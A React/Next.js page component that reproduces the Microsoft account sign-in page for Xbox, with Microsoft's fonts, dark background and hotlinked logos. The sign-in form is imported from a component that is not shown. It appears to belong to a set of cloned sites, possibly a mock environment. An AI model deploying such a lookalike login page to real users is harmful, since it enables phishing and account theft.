import React from "react";
import AuthBox from "@/components/sites/www-xbox-com-c671f65a/en-us-auth-msa-1318d508/AuthBox";

export const metadata = {
  title: "Sign in to your Microsoft account",
};

export default function AuthPage() {
  return (
    <div className="min-h-screen relative flex flex-col font-['Segoe_UI',SegoeUI,'Helvetica_Neue',Helvetica,Arial,sans-serif] bg-[#242424] md:bg-transparent md:after:fixed md:after:inset-0 md:after:bg-[#1a1a1a] md:after:z-[-2]">
      {/* Background SVG/Image (Hidden on mobile) */}
      <img
        src="https://logincdn.msauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg"
        alt=""
        className="hidden md:block fixed inset-0 w-full h-full object-cover z-[-1]"
        aria-hidden="true"
      />

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center justify-center relative z-10 w-full pb-0 md:pb-[100px]">
        <AuthBox />
      </main>

      {/* Footer */}
      <footer className="relative z-10 w-full bg-transparent text-[#d2d2d2] pt-8 pb-4 border-t border-transparent text-[12px]">
        <div className="max-w-[800px] mx-auto flex flex-col items-center gap-2 px-4">
          <div className="flex justify-center mb-2">
            <img
              src="https://logincdn.msauth.net/shared/5/js/../images/xbox_logo_white_cde084563e169a9848af.svg"
              alt="Xbox"
              className="h-[24px] w-auto opacity-70"
            />
          </div>
          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-[12px] text-[#d2d2d2]">
            <a href="#" className="hover:underline">Help and feedback</a>
            <a href="#" className="hover:underline">Terms of use</a>
            <a href="#" className="hover:underline">Privacy and cookies</a>
          </div>
          <div className="text-center text-[12px] text-[#999999] mt-2">
            Use private browsing if this is not your device. <a href="#" className="text-[#107c10] hover:underline hover:text-[#0b5c0b]">Learn more</a>
          </div>
        </div>
      </footer>
    </div>
  );
}